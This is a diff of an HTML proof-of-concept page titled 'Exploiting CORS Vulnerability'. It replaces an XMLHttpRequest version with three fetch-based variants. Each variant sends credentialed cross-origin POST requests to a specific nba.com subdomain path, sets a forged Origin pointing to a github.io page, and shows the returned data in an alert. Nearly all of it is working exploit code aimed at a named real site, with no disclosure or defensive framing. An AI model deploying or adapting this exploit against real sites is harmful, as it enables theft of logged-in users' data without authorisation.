@@ -1,25 +1,88 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-    <script>
-        function cors() {
-            var req = new XMLHttpRequest();
-            req.onload = reqListener;
-            req.open('get', 'https://cpskyhawks.gleague.nba.com/RWOCz7YXcKYRDNpvrXHn5vWD/D3fEpbQ1YONVOE/EHwtRzUrGAU/HmkjcRt/kcXYB', true);
-            req.withCredentials = true;
-            req.send();
-        }
-    </script>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Vulnerability PoC</title>
 </head>
-
 <body>
-    <center>
-        <h2>CORS PoC Exploit </h2>
-        <h3>Show full page's content</h3>
-        <div id="demo">
-            <button type="button" onclick="cors()">Exploit</button>
-        </div>
-</body>
+    <h1>Exploiting CORS Vulnerability</h1>
+    <button id="exploitButton">Exploit CORS</button>
 
+    <script>
+        document.getElementById('exploitButton').addEventListener('click', function() {
+            // Approach 1: Sending JSON data (with updated Content-Type)
+            fetch('https://cpskyhawks.gleague.nba.com/RWOCz7YXcKYRDNpvrXHn5vWD/D3fEpbQ1YONVOE/EHwtRzUrGAU/HmkjcRt/kcXYB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json;charset=UTF-8', // JSON Content-Type
+                    'Origin': 'https://moatyani.github.io/github.io/', // Replace with the attacker's domain
+                },
+                body: JSON.stringify({
+                    "sensor_data": "3;0;3618116;4272452;1,33,0,1,0,26;..." // JSON payload
+                }),
+                credentials: 'include' // This will include cookies, potentially exposing sensitive information
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Data retrieved: ' + data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to exploit CORS');
+            });
+
+            // Uncomment the block below for Approach 2: Sending raw string data
+
+            /*
+            fetch('https://cpskyhawks.gleague.nba.com/RWOCz7YXcKYRDNpvrXHn5vWD/D3fEpbQ1YONVOE/EHwtRzUrGAU/HmkjcRt/kcXYB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'text/plain;charset=UTF-8',
+                    'Origin': 'https://moatyani.github.io/github.io/',
+                },
+                body: "3;0;3618116;4272452;1,33,0,1,0,26;...", // Raw string payload
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Data retrieved: ' + data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to exploit CORS');
+            });
+            */
+
+            // Uncomment the block below for Approach 3: Sending URL-encoded data
+
+            /*
+            let urlEncodedData = new URLSearchParams();
+            urlEncodedData.append("sensor_data", "3;0;3618116;4272452;1,33,0,1,0,26;...");
+
+            fetch('https://cpskyhawks.gleague.nba.com/RWOCz7YXcKYRDNpvrXHn5vWD/D3fEpbQ1YONVOE/EHwtRzUrGAU/HmkjcRt/kcXYB', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'Origin': 'https://moatyani.github.io/github.io/',
+                },
+                body: urlEncodedData.toString(), // URL-encoded payload
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Data retrieved: ' + data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to exploit CORS');
+            });
+            */
+        });
+    </script>
+</body>
 </html>
